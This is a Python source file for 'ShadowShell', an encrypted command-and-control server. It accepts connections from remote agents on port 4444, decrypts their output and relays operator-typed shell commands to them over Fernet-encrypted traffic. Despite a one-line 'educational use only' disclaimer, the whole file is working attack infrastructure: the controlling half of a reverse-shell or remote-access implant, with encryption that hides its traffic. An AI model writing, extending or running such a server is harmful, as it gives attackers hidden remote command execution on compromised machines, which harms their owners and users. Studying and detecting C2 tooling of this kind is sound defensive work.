import socket
import threading
import argparse
from cryptography.fernet import Fernet

# ShadowShell C2 Server (Encrypted)
# Educational use only. Authorized lab testing only.

def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("[-] secret.key not found. Run generate_key.py first!")
        exit(1)

def handle_agent(conn, addr, fernet):
    print(f"[+] Encrypted beacon received from {addr[0]}:{addr[1]}")
    
    try:
        while True:
            # 1. Receive encrypted data and decrypt it
            encrypted_data = conn.recv(4096)
            if not encrypted_data:
                break
            
            try:
                decrypted_data = fernet.decrypt(encrypted_data).decode('utf-8')
            except Exception:
                print(f"[-] Failed to decrypt payload from {addr[0]}. Discarding.")
                break
            
            print(f"\n[Agent Output]:\n{decrypted_data}")
            
            # 2. Prompt operator for command
            cmd = input("ShadowShell (cmd)> ")
            if cmd.lower() in ['exit', 'quit']:
                encrypted_cmd = fernet.encrypt(b'exit')
                conn.send(encrypted_cmd)
                break
            
            # 3. Encrypt command and send
            encrypted_cmd = fernet.encrypt(cmd.encode('utf-8'))
            conn.send(encrypted_cmd)
            
    except ConnectionResetError:
        print(f"[-] Agent {addr[0]} disconnected abruptly.")
    except Exception as e:
        print(f"[-] Error with agent {addr[0]}: {e}")
    finally:
        print(f"[-] Closing connection to {addr[0]}:{addr[1]}")
        conn.close()

def start_server(host, port, fernet):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"""
    =============================================
       ShadowShell Educational C2 - Server
       Encryption: ENABLED (Fernet)
       Listening on {host}:{port}
       Waiting for beacons...
       (Press Ctrl+C to exit)
    =============================================
    """)
    
    try:
        while True:
            agent_conn, agent_addr = server.accept()
            thread = threading.Thread(target=handle_agent, args=(agent_conn, agent_addr, fernet))
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="IP to bind to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
    args = parser.parse_args()
    
    key = load_key()
    fernet = Fernet(key)
    start_server(args.host, args.port, fernet)
